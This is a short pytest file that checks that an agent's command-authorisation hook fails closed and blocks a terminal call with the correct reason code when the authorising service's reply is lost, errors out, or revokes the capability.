def test_real_client_lost_answer_aborted_blocks_as_not_sent():
    client, _ = _real_client(_bad_gateway, _states("aborted"))
    out = hook(client)(**terminal("ls"))
    assert out["action"] == "block" and "(EXECUTION_NOT_SENT)" in out["message"]


@pytest.mark.parametrize("lookup", [_bad_gateway, _connection_reset, _states()])
def test_real_client_lost_answer_not_settled_blocks_as_outcome_unknown(lookup):
    client, _ = _real_client(_connection_reset, lookup)
    out = hook(client)(**terminal("ls"))
    assert out["action"] == "block" and "(EXECUTION_OUTCOME_UNKNOWN)" in out["message"]
    assert "Nothing ran. Do not retry" in out["message"]


def test_real_client_definitive_refusal_is_not_looked_up():
    import httpx

    client, calls = _real_client(
        lambda r: httpx.Response(403, json={"ok": False, "reasonCode": "CAPABILITY_REVOKED"}), _states("verified"))
    out = hook(client)(**terminal("ls"))
    assert out["action"] == "block" and "(CAPABILITY_REVOKED)" in out["message"]
    assert not any(c.startswith("/v1/agent/receipts/") for c in calls)
